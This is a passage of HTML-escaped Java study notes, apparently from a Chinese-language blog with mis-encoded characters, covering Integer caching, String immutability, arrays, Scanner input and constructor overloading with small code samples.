&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>==&lt;/code>æ¯”è¾ƒï¼Œè¾ƒå°çš„ä¸¤ä¸ªç›¸åŒçš„&lt;code>Integer&lt;/code>è¿”å›&lt;code>true&lt;/code>ï¼Œè¾ƒå¤§çš„ä¸¤ä¸ªç›¸åŒçš„&lt;code>Integer&lt;/code>è¿”å›&lt;code>false&lt;/code>ï¼Œè¿™æ˜¯å› ä¸º&lt;code>Integer&lt;/code>æ˜¯ä¸å˜ç±»ï¼Œç¼–è¯‘å™¨æŠŠ&lt;code>Integer x = 127;&lt;/code>è‡ªåŠ¨å˜ä¸º&lt;code>Integer x = Integer.valueOf(127);&lt;/code>&lt;/p>
&lt;p>ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œ&lt;code>Integer.valueOf()&lt;/code>å¯¹äºè¾ƒå°çš„æ•°ï¼Œå§‹ç»ˆè¿”å›ç›¸åŒçš„å®ä¾‹ï¼Œå› æ­¤&lt;code>==&lt;/code>æ¯”è¾ƒâ€œæ°å¥½â€ä¸º&lt;code>true&lt;/code>ï¼Œä½†æˆ‘ä»¬ç»ä¸èƒ½å› ä¸ºJavaæ ‡å‡†åº“çš„&lt;code>Integer&lt;/code>å†…éƒ¨æœ‰ç¼“å­˜ä¼˜åŒ–å°±ç”¨&lt;code>==&lt;/code>æ¯”è¾ƒï¼Œå¿…é¡»ç”¨&lt;code>equals()&lt;/code>æ–¹æ³•æ¯”è¾ƒä¸¤ä¸ª&lt;code>Integer&lt;/code>&lt;/p>
&lt;ul>
&lt;li>å› ä¸º&lt;code>Integer.valueOf()&lt;/code>å¯èƒ½å§‹ç»ˆè¿”å›åŒä¸€ä¸ª&lt;code>Integer&lt;/code>å®ä¾‹ï¼Œå› æ­¤ï¼Œåœ¨æˆ‘ä»¬è‡ªå·±åˆ›å»º&lt;code>Integer&lt;/code>çš„æ—¶å€™ï¼Œä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼š&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>Integer n = new Integer(100);
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>Integer n = Integer.valueOf(100);
&lt;/code>&lt;/pre>&lt;p>æ–¹æ³•äºŒæ›´å¥½ï¼Œä¸ç”¨æ¯æ¬¡éƒ½newæ–°çš„å®ä¾‹è€Œæ˜¯ç›´æ¥ä½¿ç”¨é™æ€å·¥å‚æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼Œå®ƒä¼šåšåˆ°å†…éƒ¨ä¼˜åŒ–ï¼Œå°½å¯èƒ½åœ°è¿”å›ç¼“å­˜çš„å®ä¾‹ä»¥èŠ‚çœå†…å­˜&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>ä½œå¼•ç”¨ç±»å‹ï¼Œç±»ä¼¼cä¸­çš„æŒ‡é’ˆï¼Œå†…éƒ¨å­˜å‚¨ä¸€ä¸ªæŒ‡å‘å†…å­˜ä¸­çš„åœ°å€&lt;/li>
&lt;li>åŠ ä¸Š&lt;code>final&lt;/code>è¡¨ç¤ºå¸¸é‡ï¼Œåˆ›å»ºå®ä¾‹åæ— æ³•ä¿®æ”¹&lt;/li>
&lt;li>ç±»å‹åè¿‡é•¿æ—¶å¯ç”¨&lt;code>var&lt;/code>ä»£æ›¿&lt;/li>
&lt;li>&lt;code>instanceof()&lt;/code>ç¡®å®šç±»å‹&lt;/li>
&lt;/ul>
&lt;h3 id="è¿ç®—">è¿ç®—&lt;/h3>
&lt;ul>
&lt;li>æº¢å‡ºä¸æŠ¥é”™ï¼Œæ³¨æ„è‡ªæ£€&lt;/li>
&lt;li>ä¼˜å…ˆçº§å¤ªå¤šè®°ä¸ä½ï¼Œç»Ÿä¸€åŠ æ‹¬å·å®Œäº‹äº†&lt;/li>
&lt;li>ä¸¤ç§ç±»å‹ä¸åŒçš„æ•°è¿›è¡Œè¿ç®—æ—¶ä¼šå­˜åœ¨ç±»å‹çš„éšå¼è½¬æ¢ï¼ˆshort+int -&amp;gt; int+intï¼‰ï¼Œæ³¨æ„è¿ç®—ç²¾åº¦&lt;/li>
&lt;li>æ•´æ•°è¿ç®—å¾ˆå‡†ç¡®ï¼Œæ²¡æœ‰å¿…è¦ä¸ºäº†èŠ‚çœå†…å­˜è€Œä½¿ç”¨&lt;code>byte&lt;/code>å’Œ&lt;code>short&lt;/code>è¿›è¡Œæ•´æ•°è¿ç®—&lt;/li>
&lt;li>æ•´æ•°è¿ç®—åœ¨é™¤æ•°ä¸º&lt;code>0&lt;/code>æ—¶ä¼šæŠ¥é”™ï¼Œè€Œæµ®ç‚¹æ•°è¿ç®—åœ¨é™¤æ•°ä¸º&lt;code>0&lt;/code>æ—¶ï¼Œä¸ä¼šæŠ¥é”™ï¼Œè¿”å›&lt;code>NAN&lt;/code> or &lt;code>Infinity&lt;/code> or &lt;code>-Infinity&lt;/code>&lt;/li>
&lt;li>å¸ƒå°”å…³ç³»å’Œä¸‰å…ƒè¿ç®—ä¸­æ³¨æ„é€»è¾‘çŸ­è·¯&lt;/li>
&lt;li>ä¸‰å…ƒè¿ç®—&lt;code>b ? x : y&lt;/code>åé¢çš„ç±»å‹å¿…é¡»ç›¸åŒ&lt;/li>
&lt;/ul>
&lt;h3 id="å­—ç¬¦å­—ç¬¦ä¸²">å­—ç¬¦&amp;amp;å­—ç¬¦ä¸²&lt;/h3>
&lt;ul>
&lt;li>Javaçš„&lt;code>String&lt;/code>å’Œ&lt;code>char&lt;/code>åœ¨å†…å­˜ä¸­æ€»æ˜¯ä»¥Unicodeç¼–ç è¡¨ç¤º&lt;/li>
&lt;li>å­—ç¬¦charç”¨&lt;code>''&lt;/code>ï¼Œå­—ç¬¦ä¸²ç”¨&lt;code>&amp;quot;&amp;quot;&lt;/code>ï¼ˆç©ºå­—ç¬¦ä¸²ä¸ç­‰äºnullï¼‰ï¼Œå­—ç¬¦ä¸²æ‹¼æ¥å­˜åœ¨ç±»å‹éšå¼è½¬æ¢ï¼Œ&lt;code>&amp;quot;&amp;quot;&amp;quot; &amp;quot;&amp;quot;&amp;quot;&lt;/code>å†™å¤šè¡Œå­—ç¬¦ä¸²ï¼ˆåŒpyï¼‰&lt;/li>
&lt;li>javaä¸­çš„å­—ç¬¦ä¸²èµ‹å€¼æ“ä½œå¯ç›´æ¥è”æƒ³cçš„æŒ‡é’ˆè¿›è¡Œç†è§£ï¼Œé€šè¿‡å†…éƒ¨çš„&lt;code>private final char[]&lt;/code>å­—æ®µ ä»¥åŠæ²¡æœ‰ä»»ä½•ä¿®æ”¹&lt;code>char[]&lt;/code>çš„æ–¹æ³•å®ç°å­—ç¬¦ä¸²çš„ä¸å¯å˜æ€§ï¼›åŸºäºè¿™ä¸€ç‚¹ï¼Œå¦‚æœä¼ å…¥çš„å¯¹è±¡æœ‰å¯èƒ½æ”¹å˜ï¼Œæˆ‘ä»¬éœ€è¦å¤åˆ¶è€Œä¸æ˜¯ç›´æ¥å¼•ç”¨&lt;/li>
&lt;li>å­—ç¬¦ä¸²æ¯”è¾ƒå¿…é¡»ç”¨&lt;code>equals()&lt;/code>æˆ–&lt;code>equalsIgnoreCase()&lt;/code>ï¼Œä¸å¯å·æ‡’ç”¨&lt;code>==&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>æ›´å¤šå­—ç¬¦ä¸²çš„ç”¨æ³•å¯å‡ ä¹ç­‰åŒäºPythonï¼Œä¸åˆ—ä¸¾&lt;/p>
&lt;ul>
&lt;li>&lt;code>String&lt;/code>å’Œ&lt;code>char[]&lt;/code>ç±»å‹å¯ä»¥äº’ç›¸è½¬æ¢&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>char[] cs = &amp;#34;Hello&amp;#34;.toCharArray(); // String -&amp;gt; char[]
String s = new String(cs); // char[] -&amp;gt; String
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>å¦‚æœä¿®æ”¹äº†&lt;code>char[]&lt;/code>æ•°ç»„ï¼Œ&lt;code>String&lt;/code>å¹¶ä¸ä¼šæ”¹å˜&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toCharArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cs&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;X&amp;#39;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å› ä¸ºé€šè¿‡&lt;code>new String(char[])&lt;/code>åˆ›å»ºæ–°çš„&lt;code>String&lt;/code>å®ä¾‹æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›´æ¥å¼•ç”¨ä¼ å…¥çš„&lt;code>char[]&lt;/code>æ•°ç»„ï¼Œè€Œæ˜¯ä¼šå¤åˆ¶ä¸€ä»½ï¼Œæ‰€ä»¥ï¼Œä¿®æ”¹å¤–éƒ¨çš„&lt;code>char[]&lt;/code>æ•°ç»„ä¸ä¼šå½±å“&lt;code>String&lt;/code>å®ä¾‹å†…éƒ¨çš„&lt;code>char[]&lt;/code>æ•°ç»„ï¼Œå› ä¸ºè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„æ•°ç»„&lt;/p>
&lt;ul>
&lt;li>æ—©æœŸçš„Stringæ€»ä»¥char[]è¿›è¡Œå­˜å‚¨&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">offset&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">count&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œè¾ƒæ–°çš„JDKç‰ˆæœ¬çš„&lt;code>String&lt;/code>åˆ™ä»¥&lt;code>byte[]&lt;/code>å­˜å‚¨ï¼šå¦‚æœ&lt;code>String&lt;/code>ä»…åŒ…å«ASCIIå­—ç¬¦ï¼Œåˆ™æ¯ä¸ª&lt;code>byte&lt;/code>å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ï¼Œå¦åˆ™ï¼Œæ¯ä¸¤ä¸ª&lt;code>byte&lt;/code>å­˜å‚¨ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼Œå› ä¸ºå¤§é‡çš„é•¿åº¦è¾ƒçŸ­çš„&lt;code>String&lt;/code>é€šå¸¸ä»…åŒ…å«ASCIIå­—ç¬¦&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">String&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">coder&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 0 = LATIN1, 1 = UTF16
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯¹äºä½¿ç”¨è€…æ¥è¯´ï¼Œ&lt;code>String&lt;/code>å†…éƒ¨çš„ä¼˜åŒ–ä¸å½±å“ä»»ä½•å·²æœ‰ä»£ç ï¼Œå› ä¸ºå®ƒçš„&lt;code>public&lt;/code>æ–¹æ³•ç­¾åæ˜¯ä¸å˜çš„&lt;/p>
&lt;h3 id="æ•°ç»„">æ•°ç»„&lt;/h3>
&lt;ul>
&lt;li>æ–°å»ºæ•°ç»„&lt;code>int[] n = new int[5];&lt;/code>ï¼Œå¤§å°ä¸å¯å˜ï¼Œä¸ºå¼•ç”¨ç±»å‹&lt;/li>
&lt;li>å¯¹äºæ•°ç»„å…ƒç´ ï¼ˆæˆ–æ‰€æœ‰å¯è¿­ä»£çš„æ•°æ®ç±»å‹ï¼‰çš„éå†ç›´æ¥ä½¿ç”¨&lt;code>for(int n:na){}&lt;/code>ï¼Œç¼ºç‚¹æ˜¯æ— æ³•æŒ‡å®šéå†é¡ºåºï¼Œæ— æ³•è·å–æ•°ç»„ç´¢å¼•ï¼ˆnç›´æ¥ä»£è¡¨å…ƒç´ ï¼‰&lt;/li>
&lt;li>å¿«é€Ÿæ‰“å°æ•°ç»„å†…å®¹&lt;code>System.out.println(Arrays.toString(ns));&lt;/code>&lt;/li>
&lt;li>å¿«é€Ÿæ‰“å°äºŒç»´æ•°ç»„å†…å®¹&lt;code>System.out.println(Arrays.deepToString(ns));&lt;/code>&lt;/li>
&lt;li>å¯å˜å‚æ•°ç”¨&lt;code>ç±»å‹...&lt;/code>å®šä¹‰ï¼Œå¯å˜å‚æ•°ç›¸å½“äºæ•°ç»„ç±»å‹&lt;/li>
&lt;/ul>
&lt;h3 id="æµç¨‹æ§åˆ¶">æµç¨‹æ§åˆ¶&lt;/h3>
&lt;ul>
&lt;li>è¯»å–è¾“å…¥éœ€è¦&lt;code>import java.util.Scanner&lt;/code>ï¼Œç”±&lt;code>Scanner&lt;/code>å¯¹è±¡è¿›è¡Œè¯»å…¥æ“ä½œ&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Scanner&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your name: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Input your age: &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hi, %s, you are %d\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>switchè¯­å¥ä¸è¦å¿˜breakï¼Œcaseä¸ç”¨èŠ±æ‹¬å·&lt;/li>
&lt;li>&lt;code>default&lt;/code>è¯­å¥ï¼Œå¯ä»¥åœ¨æ¼å†™æŸä¸ªæšä¸¾å¸¸é‡æ—¶è‡ªåŠ¨æŠ¥é”™ï¼Œä»è€ŒåŠæ—¶å‘ç°é”™è¯¯&lt;/li>
&lt;/ul>
&lt;h2 id="oopåŸºç¡€">OOPåŸºç¡€&lt;/h2>
&lt;h3 id="ç±»å®ä¾‹">ç±»&amp;amp;å®ä¾‹&lt;/h3>
&lt;ul>
&lt;li>å¯¹è±¡é new&lt;/li>
&lt;li>ä¸€ä¸ªjavaæºæ–‡ä»¶å¯ä»¥åŒ…å«å¤šä¸ªç±»çš„å®šä¹‰ï¼Œä½†åªèƒ½å®šä¹‰ä¸€ä¸ªpublicç±»ï¼Œä¸”publicç±»åå¿…é¡»ä¸æ–‡ä»¶åä¸€è‡´ï¼›å¦‚æœè¦å®šä¹‰å¤šä¸ªpublicç±»ï¼Œå¿…é¡»æ‹†åˆ°å¤šä¸ªJavaæºæ–‡ä»¶ä¸­&lt;/li>
&lt;/ul>
&lt;h3 id="æ–¹æ³•">æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>è¯­æ³•&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>ä¿®é¥°ç¬¦ æ–¹æ³•è¿”å›ç±»å‹ æ–¹æ³•å(æ–¹æ³•å‚æ•°åˆ—è¡¨) {
è‹¥å¹²æ–¹æ³•è¯­å¥;
return æ–¹æ³•è¿”å›å€¼;
}
// æ— return è¿”å›ç±»å‹ä¸ºvoid
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>å˜é‡è®¾ä¸ºprivateåå¯ä»¥é€šè¿‡publicå¯¹å¤–çš„æ–¹æ³•é—´æ¥ä¿®æ”¹&lt;/li>
&lt;li>æ²¡äº‹å„¿å°±å°½å¯èƒ½å°‘ç”¨publicï¼Œå°‘æš´éœ²å¯¹å¤–çš„æ–¹æ³•&lt;/li>
&lt;li>ä¸ç±»åç›¸åŒçš„æ–¹æ³•ä½œä¸ºconstructæ„é€ æ–¹æ³•ï¼Œæ— è¿”å›å€¼&lt;/li>
&lt;li>å…ˆåˆå§‹åŒ–å­—æ®µï¼Œå†æ‰§è¡Œæ„é€ æ–¹æ³•ï¼ˆå¯è¦†ç›–å‰é¢çš„&lt;/li>
&lt;li>å¯å®šä¹‰å¤šä¸ªæ„é€ æ–¹æ³•ï¼ˆä¼ å…¥å‚æ•°ç±»å‹ æ•°é‡ä¸åŒï¼‰ï¼Œnewæ—¶ä¼šè‡ªåŠ¨åŒ¹é…ï¼›ä¸€ä¸ªæ„é€ æ–¹æ³•å¯ä»¥è°ƒç”¨å…¶ä»–æ„é€ æ–¹æ³•ï¼ˆä¾¿äºä»£ç å¤ç”¨ï¼‰ï¼Œè¯­æ³•&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">18&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨å¦ä¸€ä¸ªæ„é€ æ–¹æ³•Person(String, int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unnamed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨å¦ä¸€ä¸ªæ„é€ æ–¹æ³•Person(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
